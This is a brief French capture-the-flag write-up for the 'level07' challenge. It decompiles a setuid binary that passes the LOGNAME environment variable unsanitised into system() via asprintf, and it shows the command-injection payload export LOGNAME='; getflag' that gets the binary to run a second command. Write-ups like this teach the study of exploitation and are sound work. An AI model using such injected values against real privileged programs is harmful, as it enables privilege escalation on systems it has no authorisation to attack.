On voit le binaire level07, en le desassemblant on trouve le code:
    int main(int argc,char **argv,char **envp)
    {
      char *pcVar1;
      int iVar2;
      char *buffer;
      gid_t gid;
      uid_t uid;
      char *local_1c;
      __gid_t local_18;
      __uid_t local_14;
    
      local_18 = getegid();
      local_14 = geteuid();
      setresgid(local_18,local_18,local_18);
      setresuid(local_14,local_14,local_14);
      local_1c = (char *)0x0;
      pcVar1 = getenv("LOGNAME");
      asprintf(&local_1c,"/bin/echo %s ",pcVar1);
      iVar2 = system(local_1c);
      return iVar2;
    }

on repere 3 ligne en particulier: 
    pcVar1 = getenv("LOGNAME"); recupere la valeur dand la variable local LOGNAME
    asprintf(&local_1c,"/bin/echo %s ",pcVar1); execute la commande asprintf cf: sprintf
    iVar2 = system(local_1c); execute la chaine creer dans asprintf

on comprend que une chaine de format => "/bin/echo ${LOGNAME}" est executer
si on met la valeur de LOGNAME a ; getflag c' est getflag qui seras executer
    export LOGNAME="; getflag"
